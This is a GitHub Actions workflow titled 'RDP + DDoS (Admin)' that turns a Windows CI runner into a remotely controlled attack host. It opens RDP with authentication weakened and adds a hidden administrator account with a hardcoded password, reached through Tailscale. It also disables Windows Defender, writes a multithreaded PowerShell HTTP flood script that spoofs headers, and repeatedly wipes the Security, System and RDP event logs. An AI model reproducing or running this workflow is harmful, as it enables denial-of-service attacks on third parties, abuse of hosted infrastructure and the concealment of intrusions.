name: RDP + DDoS (Admin)

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: Enable RDP & Firewall
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
          Restart-Service -Name TermService -Force
          Start-Sleep -Seconds 5

      - name: Create Hidden Admin Account (Forced)
        run: |
          $username = "Hex0"
          $password = "Hex0#2026"

          if (Get-LocalUser -Name $username -ErrorAction SilentlyContinue) {
            Remove-LocalUser -Name $username -ErrorAction SilentlyContinue
          }

          $sec = ConvertTo-SecureString $password -AsPlainText -Force
          New-LocalUser -Name $username -Password $sec -PasswordNeverExpires -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member $username
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $username
          Enable-LocalUser -Name $username

          reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v $username /t REG_DWORD /d 0 /f

          Write-Host "User $username created with password $password"

      - name: Install Tailscale & Get IP
        env:
          TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
        run: |
          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\t.msi"
          Start-Process msiexec -ArgumentList "/i C:\t.msi /quiet /norestart" -Wait
          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$env:TAILSCALE_AUTHKEY" --hostname="github-rdp"
          $ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
          Write-Host "IP: $ip"
          Write-Host "User: Hex0"
          Write-Host "Pass: Hex0#2026"
          Remove-Item C:\t.msi -Force -ErrorAction SilentlyContinue

      - name: Disable Windows Defender
        run: |
          Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
          Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
          Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
          Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
          Write-Host "Defender disabled."

      - name: Create DDoS Script (PowerShell)
        run: |
          $ddos = @'
          param($Target, $Threads = 100, $Rate = 200)
          while ($true) {
            $jobs = @()
            for ($i = 0; $i -lt $Threads; $i++) {
              $jobs += Start-Job -ScriptBlock {
                param($url)
                $wc = New-Object System.Net.WebClient
                $rand = [System.Random]::new()
                $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$($rand.Next(90,120)).0.0.0 Safari/537.36")
                $wc.Headers.Add("X-Forwarded-For", "$($rand.Next(1,255)).$($rand.Next(1,255)).$($rand.Next(1,255)).$($rand.Next(1,255))")
                try { $wc.DownloadString($url) } catch {}
              } -ArgumentList $Target
            }
            $jobs | Receive-Job -Wait
            Start-Sleep -Milliseconds (1000 / $Rate)
          }
          '@
          $ddos | Out-File -FilePath "C:\ddos.ps1" -Encoding ASCII

      - name: Keep Alive & Log Wipe
        run: |
          for ($i = 1; $i -le 360; $i++) {
            Start-Sleep -Seconds 60
            if ($i % 30 -eq 0) {
              wevtutil cl Security -ErrorAction SilentlyContinue
              wevtutil cl System -ErrorAction SilentlyContinue
              wevtutil cl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" -ErrorAction SilentlyContinue
            }
          }
